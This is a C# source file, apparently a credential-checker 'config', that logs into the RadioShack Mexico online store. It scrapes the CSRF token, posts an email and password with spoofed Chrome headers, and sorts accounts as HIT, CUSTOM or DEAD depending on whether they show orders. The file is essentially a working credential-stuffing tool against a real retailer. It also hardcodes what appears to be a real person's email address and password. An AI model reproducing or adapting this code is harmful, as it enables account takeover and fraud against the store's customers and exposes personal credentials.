using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class RadioHacks
    {
        public static void radiohack()
        {
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                string email = "sofiaplaza66@gmail.com";
                string pass = "sofiaplaza66";
                string send_data = req.Get("https://www.radioshack.com.mx/store/radioshack/en/login", null).ToString();
                var token = Fox.Fuctions.Parsing.LR(send_data, "name=\"CSRFToken\" value=\"", "\" />");
                req.AddHeader("Host", "www.radioshack.com.mx");
                req.AddHeader("onnection", "keep-alive");
                req.AddHeader("Cache-Control", "max-age=0");
                req.AddHeader("sec-ch-ua", "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"");
                req.AddHeader("sec-ch-ua-mobile", "?0");
                req.AddHeader("Upgrade-Insecure-Requests", "1");
                req.AddHeader("Origin", "https://www.radioshack.com.mx");
                req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36";
                req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                req.AddHeader("Sec-Fetch-Site", "same-origin");
                req.AddHeader("Sec-Fetch-Mode", "navigate");
                req.AddHeader("Sec-Fetch-User", "?1");
                req.AddHeader("Sec-Fetch-Dest", "Sec-Fetch-Dest");
                req.Referer = "https://www.radioshack.com.mx/store/radioshack/en/login";
                req.AddHeader("Accept-Language", "es-419,es;q=0.9");
                req.AddHeader("Accept-Encoding", "gzip, deflate");
                string payload = "j_username=" + email +"&j_password=" + pass +"&CSRFToken=" + token;
                send_data = req.Post("https://www.radioshack.com.mx/store/radioshack/en/j_spring_security_check", payload, "application/x-www-form-urlencoded").ToString();
                if (send_data.Contains("Mi cuenta"))
                {
                    req.AddHeader("Host", "www.radioshack.com.mx");
                    req.AddHeader("Connection", "keep-alive");
                    req.AddHeader("Cache-Control", "max-age=0");
                    req.AddHeader("sec-ch-ua", "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"");
                    req.AddHeader("sec-ch-ua-mobile", "?0");
                    req.AddHeader("Upgrade-Insecure-Requests", "1");
                    req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36";
                    req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                    req.AddHeader("Sec-Fetch-Site", "same-origin");
                    req.AddHeader("Sec-Fetch-Mode", "navigate");
                    req.AddHeader("Sec-Fetch-User", "?1");
                    req.AddHeader("Sec-Fetch-Dest", "documen");
                    req.Referer = "https://www.radioshack.com.mx/store/radioshack/en/my-account/billing-details";
                    req.AddHeader("Accept-Language", " es-419,es;q=0.");
                    req.AddHeader("Accept-Encoding", "gzip, deflate");
                    send_data = req.Get("https://www.radioshack.com.mx/store/radioshack/en/my-account/orders", null).ToString();
                    if (send_data.Contains("Orden ID de Radio Shack"))
                    {
                        Console.WriteLine("HIT");
                    }
                    else if (!(send_data.Contains("Orden ID de Radio Shack")))
                    {
                        Console.WriteLine("CUSTOM");

                    }

                }
                else if (send_data.Contains("Por favor ingresa un correo válido"))
                {
                    Console.WriteLine("DEAD");
                }


                Console.ReadKey();

            }
        }
    }
}
